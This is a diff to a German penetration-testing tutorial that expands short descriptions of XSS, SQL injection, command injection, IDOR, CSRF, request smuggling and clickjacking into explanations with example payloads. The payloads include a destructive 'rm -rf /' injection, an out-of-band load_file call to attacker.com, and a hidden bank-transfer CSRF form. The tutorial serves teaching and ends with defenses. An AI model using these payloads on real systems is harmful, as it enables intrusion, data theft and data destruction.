@@ -573,8 +573,6 @@ In der Realität sind Webanwendungen weitaus komplexer als das vereinfachte Clie
 - **Datenbank**: Speichert die Daten der Anwendung (z.B. SQL oder NoSQL).
 - **Caching-System**: Speichert häufig abgerufene Daten, um die Leistung zu verbessern.
 - **Job-Server**: Führen asynchrone Aufgaben aus.
-- **Job-Queue**: Stellt Aufgaben für die Job-Server bereit.
-- **Full-Text-Search-Service**: Ermöglicht die Suche nach Inhalten.
 - **Cloud Storage**: Speichert Daten langfristig.
 - **CDN (Content Delivery Network)**: Liefert statische Inhalte schnell aus.
 - **Data Warehouse**: Speichert große Datenmengen für Analysen.
@@ -585,31 +583,104 @@ Diese vielschichtige Architektur bietet zahlreiche Angriffspunkte für das Pente
 Sobald wir die Möglichkeit haben, Systeme zu steuern und eigene Eingaben zu machen, ergeben sich potenzielle Angriffsvektoren. Hier sind einige der häufigsten Schwachstellen:
 
 ### Cross-Site Scripting (XSS)
-Einschleusen von JavaScript-Code in die Webseite eines anderen Benutzers. Es gibt drei Arten von XSS:
+Cross-Site Scripting (XSS) ermöglicht es einem Angreifer, schädlichen JavaScript-Code in die Webseite eines anderen Benutzers einzuschleusen. Das Ziel ist oft, Sitzungsdaten zu stehlen, Benutzeraktionen zu manipulieren oder schädliche Inhalte anzuzeigen. Es gibt drei Hauptarten von XSS:
 
-1. **Stored XSS**: Der Code wird persistent in einer Datenbank gespeichert.
-2. **Reflected XSS**: Der Code wird nicht persistent gespeichert, sondern als Parameter in der URL übergeben.
-3. **DOM-based XSS**: Der Code wird durch Manipulation des DOM-Baums eingeschleust.
+1. **Stored XSS**: Der schädliche Code wird persistent auf dem Server gespeichert, z. B. in einer Datenbank. Dieser Code wird bei jedem Abruf der Seite durch andere Benutzer ausgeführt. Dies kann z. B. durch Kommentarfelder oder Profilbeschreibungen erfolgen.
+   ```javascript
+   // Beispiel: Ein gespeicherter Kommentar, der schädliches JavaScript enthält
+   <script>alert('Stored XSS!');</script>
+   ```
+
+2. **Reflected XSS**: Der schädliche Code wird über eine URL als Parameter an den Server gesendet und direkt zurückgegeben. Das passiert z. B., wenn eine Suchanfrage als Teil des HTMLs ausgegeben wird, ohne die Eingabe korrekt zu validieren.
+   ```html
+   <!-- Beispiel-URL -->
+   https://example.com/search?q=<script>alert('Reflected XSS');</script>
+   ```
+
+3. **DOM-based XSS**: Hierbei wird der DOM-Baum der Webseite durch manipulierte JavaScript-Eingaben verändert. Der Angriff erfolgt komplett auf der Client-Seite und erfordert keine serverseitige Interaktion.
+   ```javascript
+   // Beispiel: Unsichere Manipulation des DOM
+   var userInput = location.hash.substring(1);
+   document.getElementById('output').innerHTML = userInput;
+   // Bei Eingabe von: https://example.com/#<script>alert('DOM XSS');</script>
+   ```
 
 ### SQL Injection (SQLI)
-Manipulation von SQL-Queries, um die Datenbank anzugreifen. Es gibt drei Arten von SQLI:
+SQL Injections ermöglichen es einem Angreifer, SQL-Queries zu manipulieren, um Zugriff auf vertrauliche Daten zu erhalten oder Daten zu verändern. Die Angriffe können in drei Kategorien eingeteilt werden:
 
-1. **In-Band SQLI**: Der Output der manipulierten Query wird direkt angezeigt.
-2. **Inferential SQLI**: Der Output wird nicht direkt angezeigt, sondern durch Timing- und boolesche Logik ermittelt.
-3. **Out-of-Band SQLI**: Der Output wird an eine externe Ressource gesendet.
+1. **In-Band SQLI**: Der Output der manipulierten Query wird direkt in der Antwort angezeigt. Zum Beispiel kann durch Manipulation des "WHERE"-Statements in einem Login-Formular ein Login ohne Passwort erfolgen:
+   ```sql
+   SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
+   ```
+
+2. **Inferential SQLI (Blind SQLI)**: Der Angreifer erhält keinen direkten Output, kann jedoch über Timing-Angriffe oder boolesche Bedingungen Rückschlüsse ziehen.
+   ```sql
+   -- Zeitbasierter Angriff
+   SELECT IF(1=1, SLEEP(5), null);
+   -- Die Antwort verzögert sich um 5 Sekunden, wenn die Bedingung wahr ist
+   ```
+
+3. **Out-of-Band SQLI**: Der Angreifer erhält die Daten über einen externen Kanal, zum Beispiel per HTTP-Anfrage an einen externen Server.
+   ```sql
+   SELECT load_file('\\attacker.com\payload');
+   ```
 
 ### Command Injection
-Manipulation von Daten, um Systembefehle auszuführen.
+Command Injections ermöglichen es Angreifern, Systembefehle auf dem Server auszuführen, indem unsichere Nutzereingaben in Systemfunktionen eingefügt werden. Zum Beispiel:
+```python
+import os
+
+# Unsichere Eingabe, die direkt in eine Systemfunktion übernommen wird
+user_input = "test.txt; rm -rf /"
+os.system(f"cat {user_input}")
+# Der Angreifer könnte hier durch Eingabe von "test.txt; rm -rf /" schädlichen Code ausführen
+```
 
 ### Insecure Direct Object Reference (IDOR)
-Direkter Zugriff auf Ressourcen anderer Benutzer durch Manipulation von IDs.
+Bei IDOR greifen Angreifer auf Ressourcen anderer Benutzer zu, indem sie IDs in der URL manipulieren. Zum Beispiel:
+```http
+GET /user/12345/profile
+# Ein Angreifer ändert die ID auf /user/12346/profile und erhält damit unberechtigt Zugriff auf fremde Daten
+```
 
 ### Cross-Site Request Forgery (CSRF)
-Ausnutzen der Tatsache, dass Browser Cookies für das Ziel und nicht für die Quelle einer Anfrage verwenden.
+Ein CSRF-Angriff zwingt den Browser eines authentifizierten Benutzers dazu, eine schädliche Aktion auf einer vertrauenswürdigen Webseite auszuführen. Angreifer nutzen dazu die Tatsache, dass Browser automatisch Cookies für das Ziel senden, unabhängig von der Quelle der Anfrage.
+```html
+<!-- Beispiel: CSRF-Formular, das im Hintergrund Geld überweist -->
+<form action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="amount" value="1000">
+  <input type="hidden" name="to_account" value="attacker_account">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+```
 
 ### HTTP Request Smuggling
-Manipulation von HTTP-Anfragen, um Daten in die Anfragen anderer Benutzer einzuschleusen.
+Bei HTTP Request Smuggling manipuliert der Angreifer HTTP-Anfragen, um zwei unterschiedliche Interpretationen der Anfrage durch unterschiedliche Server zu erzwingen. Dies kann genutzt werden, um schädlichen Content einzuschleusen.
+
+```http
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+POST /malicious HTTP/1.1
+Content-Length: 0
+
+```
 
 ### Clickjacking
-Einbetten der angegriffenen Seite in einen unsichtbaren `iframe`, um den Benutzer zum Klicken auf versteckte Elemente zu verleiten.
+Beim Clickjacking wird eine legitime Seite in einen unsichtbaren `iframe` eingebettet, und der Benutzer wird verleitet, unbewusst auf Elemente zu klicken, die ihm schaden können.
+```html
+<!-- Unsichtbarer iframe, der eine schädliche Seite überdeckt -->
+<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
+<button onclick="executeAttack()">Klicken Sie hier für einen Preis!</button>
+```
+
+Diese Angriffe sind sehr verbreitet und oft effektiv, wenn keine ausreichenden Sicherheitsvorkehrungen getroffen werden. Die besten Abwehrmaßnahmen bestehen aus Input-Validierung, sicherer Codierung und der Verwendung von Sicherheitsmechanismen wie CSRF-Tokens, Content Security Policy (CSP) und weiteren Schutzmaßnahmen.
+
+
 
